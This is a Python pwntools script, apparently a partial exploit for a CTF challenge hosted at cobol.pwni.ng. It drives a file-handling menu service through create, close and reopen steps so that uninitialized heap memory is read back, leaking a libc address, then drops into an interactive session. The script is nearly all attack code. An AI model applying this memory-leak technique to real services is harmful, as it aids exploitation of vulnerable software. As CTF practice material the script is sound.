#!/usr/bin/env python3
import struct

from pwn import *


def prompt(tube, n):
    tube.sendlineafter("> \n", str(n))


def create_file(tube, file_name, index, buf_size):
    prompt(tube, 1)
    tube.sendlineafter("File Name: \n", file_name)
    tube.sendlineafter("Index: \n", str(index))
    tube.sendlineafter("Buf Size: \n", str(buf_size))


def open_file(tube, file_name, index, buf_size):
    prompt(tube, 2)
    tube.sendlineafter("File Name: \n", file_name)
    tube.sendlineafter("Index: \n", str(index))
    tube.sendlineafter("Buf Size: \n", str(buf_size))


def read_file(tube, index):
    prompt(tube, 3)
    tube.sendlineafter("Index: \n", str(index))


def write_file(tube, index, data):
    prompt(tube, 4)
    tube.sendlineafter("Index:\n", str(index))
    tube.sendafter("Input:\n", data)
    tube.sendlineafter("Read More (Y/y for yes)\n", "n")


def close_file(tube, index):
    prompt(tube, 5)
    tube.sendlineafter("Index: \n", str(index))


def copy_file(tube, src_path, dst_path):
    prompt(tube, 6)
    tube.sendlineafter("Enter filename1: \n", src_path)
    tube.sendlineafter("Enter filename2: \n", dst_path)


def _exit(tube):
    prompt(tube, 7)


def connect():
    if args.LOCAL:
        return gdb.debug(["./chall"], api=True)
    else:
        return remote("cobol.pwni.ng", 3083)


def main():
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.continue_nowait()
        create_file(tube, "/tmp/foo", 1, 0x800)
        write_file(tube, 1, b"X")
        create_file(tube, "/tmp/bar", 2, 0x800)
        close_file(tube, 1)
        open_file(tube, "/tmp/foo", 1, 0x800)
        read_file(tube, 1)
        leak = tube.recvn(0x800)
        libc = struct.unpack('<Q', leak[:8])[0] - 0x3ebc58
        print(f"libc = 0x{libc:x}")
        assert libc & 0xfff == 0
        tube.interactive()


if __name__ == "__main__":
    main()
